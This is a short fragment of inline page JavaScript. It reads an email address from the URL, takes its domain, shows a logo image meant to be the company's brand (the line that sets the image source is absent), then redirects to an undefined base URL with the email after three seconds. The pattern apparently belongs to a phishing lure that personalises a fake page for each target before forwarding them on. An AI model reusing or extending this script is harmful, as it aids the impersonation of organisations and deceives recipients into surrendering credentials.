    function getEmailFromQuery() {
      const params = new URLSearchParams(window.location.search);
      return params.get('email') ? decodeURIComponent(params.get('email')) : '';
    }

    function extractDomain(email) {
      const parts = email.split('@');
      return parts.length > 1 ? parts[1] : '';
    }

    const email = getEmailFromQuery();
    const domain = extractDomain(email);

    if (domain) {
      const logoImg = document.getElementById('domainLogo');
      // Using Clearbit Logo API (public) to get the company's logo

      logoImg.style.display = 'block';
    }

    setTimeout(() => {
      window.location.href = `${redirectBaseUrl}?email=${encodeURIComponent(email)}`;
    }, 3000); // redirect after 3 seconds
  </script>
